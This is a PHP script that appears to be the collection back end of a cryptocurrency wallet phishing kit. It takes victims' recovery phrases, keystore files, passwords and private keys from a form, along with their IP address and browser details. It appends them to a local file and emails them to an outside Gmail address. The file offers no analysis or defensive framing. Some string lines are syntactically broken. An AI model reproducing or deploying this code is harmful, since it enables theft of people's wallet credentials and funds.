<?php
$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "New Message\n";
$message .= "Wallet : ".$_POST['sub']."\n";
$message .= "----------------------
$message .= "Phrase : ".$_POST['typee']."\n";
$message .= "----------------------
$message .= "keystorejson : ".$_POST['typee1']."\n";
$message .= "Password : ".$_POST['psw']."\n";
$message .= "----------------------
$message .= "Key : ".$_POST['key']."\n";


$subject="Wallet login";


$message .= "HostName : ".$hostname."\n";
$message .= "IP Address $ip on $time\n";
$message .= "Browser: $useragent\n";
$message .= "----------------------By May-\n";


$to = "debra.white1000@gmail.com";
$from = "From: May <info@studio.com>";
$from .= $_POST['eMailAdd']."\n";
$from .= "MIME-Version: 1.0\n";

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);

mail($to,$subject,$message, $from);

print "Thank you";


?>

